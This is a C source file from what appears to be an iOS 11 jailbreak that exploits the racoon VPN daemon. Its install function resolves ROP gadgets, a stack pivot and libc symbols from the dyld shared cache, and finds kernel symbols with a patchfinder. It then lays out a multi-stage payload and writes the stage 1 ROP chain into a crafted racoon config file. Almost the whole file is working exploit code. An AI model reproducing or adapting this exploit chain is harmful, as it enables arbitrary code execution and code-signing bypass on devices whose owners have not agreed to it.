#include <fcntl.h>
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/stat.h>
#include "common.h"
#include "stage1.h"
#include "stage2.h"
#include "uland_offsetfinder.h"
#include "../shared/realsym.h"
#include "../shared/offsets.h"
#include "img.h"
#include "patchfinder.h"
#include "generated/install_stage3_offsets.h"

// where all the implemented magic happens :P
int install(const char *config_path, const char *racoon_path, const char *dyld_cache_path)
{
// Don't let this dynamic stuff fool you, there's still static offsets here like mach_msg_offset
#if (J96AP & IOS_11_3_1)
	// this basically just initalizes the myoffsets structure. THis is the only part that prevent the jailbreak from working on all devices/versions because the offsetfinders (I think mainly the kernel one) is still broken
	// so in theory you could also remove all the offsetfinders and just get the symbols by hand
	// For examples on how they look like, just look at the git history at some point there were no offsetfinders and all of this was hardcoded for a specific device (either ipad mini gen 4 wifi iOS 11.1.2 or 11.3.1)

	// init the userland offsetfinder implemented in uland_offsetfinder.m (thi will get all the gadgets for us)
	init_uland_offsetfinder(racoon_path,dyld_cache_path);

	// init the kernel offset finder (libjake)
	jake_img_t kernel_symbols = malloc(sizeof(jake_img));

	if (jake_init_image(kernel_symbols, "/System/Library/Caches/com.apple.kernelcaches/kernelcache")) {
		LOG("Patchfinder init failed\n");
		return -1;
	}

	offset_struct_t myoffsets;
	// for the symbol finder we need a string xref finder and some instruction decoding mechanism
	// we need to have some xref finder for code
	// For instruction decoding we need the b.gt instruction as well as the adr instruction and cbnz,cbz,blr and ldr

	myoffsets.dns4_array_to_lcconf = -((isakmp_cfg_config_addr()+0x28-4*8)-lcconf_addr()); 
	myoffsets.str_buff_offset = 8;
	myoffsets.max_slide = get_cache_maxslide();
	myoffsets.slide_value = 0x4000;
	myoffsets.pivot_x21 = (uint64_t)get_pivot_x21_gadget();
	myoffsets.pivot_x21_x9_offset = 0x50-0x38;
	myoffsets.memmove = (uint64_t)memmove_cache_ptr(dyld_cache_path);
	myoffsets.lcconf_counter_offset = 0x10c;
	myoffsets.cache_text_seg_size = 0x30000000;
	myoffsets.new_cache_addr = 0x1c0000000; // you might want to change this because it might not work on the 5S but it should be fine for us

	myoffsets.BEAST_GADGET = (uint64_t)get_beast_gadget();
	myoffsets.BEAST_GADGET_LOADER = myoffsets.BEAST_GADGET+4*9;
	myoffsets.BEAST_GADGET_CALL_ONLY = myoffsets.BEAST_GADGET+4*8;
	myoffsets.str_x0_gadget = (uint64_t)get_str_x0_gadget();
	myoffsets.str_x0_gadget_offset = 0x28;
	myoffsets.cbz_x0_gadget = (uint64_t)get_cbz_x0_gadget();
	myoffsets.cbz_x0_x16_load = (uint64_t)get_cbz_x0_x16_load((void*)myoffsets.cbz_x0_gadget);
	myoffsets.add_x0_gadget = (uint64_t)get_add_x0_gadget();
	myoffsets.rop_nop = myoffsets.BEAST_GADGET+4*17;
	myoffsets.errno_offset = (uint64_t)get_errno_offset(dyld_cache_path);
	myoffsets.mach_msg_offset = 0x1f1535018;

	myoffsets.longjmp = realsym(dyld_cache_path,"__longjmp");
	myoffsets.stack_pivot = (uint64_t)get_stackpivot_addr(dyld_cache_path);
	myoffsets.open = realsym(dyld_cache_path,"_open");
	myoffsets.mmap = realsym(dyld_cache_path,"__mmap");
	myoffsets.memcpy = realsym(dyld_cache_path,"_memcpy");
	myoffsets.fcntl_raw_syscall = realsym(dyld_cache_path,"__fcntl");
	myoffsets.raw_mach_vm_remap_call = realsym(dyld_cache_path,"_mach_vm_remap");

	// kernel symbols/offsets below (iirc one of the struct offsets changed between iOS 11.1.2 and 11.3.1 so watch out for that)
	myoffsets.rootdomainUC_vtab = jake_find_symbol(kernel_symbols,"__ZTV20RootDomainUserClient");
	myoffsets.swapprefix_addr = find_swapprefix(kernel_symbols);
#else
	void* kernel_symbols = NULL;
	offset_struct_t myoffsets;
    // adr @ 0x100067c10
    // ldr @ 0x1000670e0
    myoffsets.dns4_array_to_lcconf = OFF_DNS4_ARRAY_TO_LCCONF;
    myoffsets.str_buff_offset = OFF_STR_BUFF;
    myoffsets.max_slide = OFF_MAX_SLIDE;
    myoffsets.slide_value = OFF_SLIDE_VALUE;
    myoffsets.pivot_x21 = OFF_PIVOT_X21;
    myoffsets.pivot_x21_x9_offset = OFF_PIVOT_X21_X9;
    myoffsets.memmove = OFF_MEMMOVE;
	myoffsets.lcconf_counter_offset = OFF_LCCONF_COUNTER;
	myoffsets.cache_text_seg_size = OFF_CACHE_TEXT_SEG_SIZE;
	myoffsets.new_cache_addr = OFF_NEW_CACHE_ADDR;

    myoffsets.BEAST_GADGET = OFF_BEAST_GADGET;
    myoffsets.BEAST_GADGET_LOADER = myoffsets.BEAST_GADGET+4*9;
    myoffsets.BEAST_GADGET_CALL_ONLY = myoffsets.BEAST_GADGET+4*8;
    myoffsets.str_x0_gadget = OFF_STR_X0_GADGET;
    myoffsets.str_x0_gadget_offset = OFF_STR_X0_GADGET_OFF;
    myoffsets.cbz_x0_gadget = OFF_CBZ_X0_GADGET;
    myoffsets.cbz_x0_x16_load = OFF_CBZ_X0_X16_LOAD;
    myoffsets.add_x0_gadget = OFF_ADD_X0_GADGET;
    myoffsets.rop_nop = myoffsets.BEAST_GADGET+4*17;
    myoffsets.errno_offset = OFF_ERRNO;
    myoffsets.mach_msg_offset = OFF_NDR_RECORD;

    myoffsets.longjmp = OFF_LONGJMP;
    myoffsets.stack_pivot = OFF_STACK_PIVOT;
    myoffsets.mmap = OFF_MMAP;
    myoffsets.memcpy = OFF_MEMCPY;
    myoffsets.open = OFF_OPEN;
    myoffsets.fcntl_raw_syscall = OFF_FCNTL_RAW;
    myoffsets.raw_mach_vm_remap_call = OFF_RAW_MACH_VM_REMAP;

    myoffsets.rootdomainUC_vtab = OFF_ROOTDOMAINUC_VTAB; // iometa
    myoffsets.swapprefix_addr = OFF_SWAPPREFIX_ADDR;
#endif

	// myoffsets.stage1_ropchain is set by ROP_SETUP(offsets->stage1_ropchain) in stage1.m
	// myoffsets.stage2_ropchain is set by INIT_FRAMEWORK(offsets) in stage2.m
	myoffsets.stage2_base = myoffsets.new_cache_addr+myoffsets.cache_text_seg_size+0x4000; // just place stage 2 behind the remaped cache
	// myoffsets.stage2_size is set to chain_pos + 0x1000 in stage2.m
	myoffsets.stage2_max_size = 0x200000; // I hardcoded this, if stage 2 ever gets bigger than that you would need to adjust it
	myoffsets.thread_max_size = 0x10000; // there is a seperate thread in stage 2 (the race thread that spams the syscall and this is it's rop stack max size, so be careful when modifing it esp unrolling the loop more so that you never get passed this limit)
	// myoffsets.stage2_databuffer is set to malloc(offsets->stage2_databuffer_len) in stage2.m
	myoffsets.stage2_databuffer_len = 0x10000; // Moved from stage2.m
	myoffsets.stage2_barrier_buffer_size = 0x10000; // Moved from stage2.m
	myoffsets.stage3_fileoffset = 0; // at which place in the file (dylib) stage 3 (the code section) starts
	myoffsets.stage3_size = 0x10000; // get the file size and round at page boundary (should be between 0x14000 and 0x18000 bytes)
	myoffsets.stage3_loadaddr = myoffsets.new_cache_addr-0x100000; // place stage 3 in front of the remaped cache

	// This has to update any time stage 3 is recompiled
    myoffsets.stage3_jumpaddr = myoffsets.stage3_loadaddr + STAGE3_JUMP;
	myoffsets.stage3_CS_blob = STAGE3_CSBLOB; 
	myoffsets.stage3_CS_blob_size = STAGE3_CSBLOB_SIZE;

	// generate stage 2 before stage 1 cause stage 1 needs to know the size of it
	stage2(kernel_symbols,&myoffsets,"/private/etc/racoon/");

	// generate stage 1
	if (mkdir("/var/run/racoon/", 0777) < 0 && errno != EEXIST) return errno;
	int f = open("/var/run/racoon/test.conf",O_WRONLY | O_CREAT,0644);
	stage1(f,&myoffsets);
	close(f);

	return 0;
}
